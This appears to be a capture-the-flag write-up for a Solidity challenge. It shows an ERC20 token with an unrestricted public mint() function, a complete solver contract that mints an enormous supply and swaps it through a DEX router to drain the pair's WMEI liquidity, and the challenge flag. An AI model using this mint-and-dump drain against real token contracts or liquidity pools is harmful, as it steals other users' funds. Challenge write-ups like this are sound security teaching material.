# Challenge 02 : Dive into real life stuff [9 solves] [498 points] [First blood 🩸]

```
If you're at this point, you're probably Solidity fluent
So, in real life, trading takes place on DEXes.
There is a DEX ! This ERC20 will be deployed as a pair on it.
Steal the money ! It has to have less that 0.5 WMEL liquidities.
```

Our goal is to drain the pair contract until it has less than 0.5 WMEI

The challenge 2 contract is an ERC20 token called PWNNERN

It has a mint() function, allowing everyone to mint the token :

```solidity
    function mint(uint amount) external 
    {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }
```

So we can just mint a lot of this token and swap to WMEI with the router

```solidity
pragma solidity ^0.8.0;

import "./chall2.sol";

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract chall2_solve {
    constructor(address chall2, address router, address wmei) public {
        hero2302(chall2).mint(999999999999 ether);
        hero2302(chall2).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = chall2;
        path[1] = wmei;
        Router(router).swapExactTokensForTokens(999999999999 ether, 0, path, address(this), type(uint256).max);
    }
}
```

Flag :
```
Hero{Th1s_1_w4s_3z_bro}
```